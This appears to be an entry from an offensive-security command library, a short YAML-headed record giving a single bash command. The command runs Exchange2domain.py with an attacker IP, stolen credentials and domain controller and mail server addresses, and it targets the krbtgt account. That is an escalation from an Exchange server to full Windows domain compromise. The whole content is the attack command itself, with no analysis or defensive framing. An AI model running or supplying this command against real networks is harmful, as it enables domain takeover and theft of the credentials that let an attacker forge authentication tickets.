---
id: 7a59648e-da31-458a-b476-e3d845ac55db
name: Run Exchange2domain script with attacker IP, username, password, domain, DC
  IP and Mail Server IP
type: command
executor: bash
data: python Exchange2domain.py -ah [attacker IP] -u [username] -p [password] -d [domain]
  -th [DC IP] --just-dc-user krbtgt [Mail Server IP]
output: null
created_at: '2023-04-06T03:56:08.023354+00:00'
updated_at: '2023-04-10T20:26:32.381858+00:00'
---

# Run Exchange2domain script with attacker IP, username, password, domain, DC IP and Mail Server IP

```bash
python Exchange2domain.py -ah [attacker IP] -u [username] -p [password] -d [domain] -th [DC IP] --just-dc-user krbtgt [Mail Server IP]
```
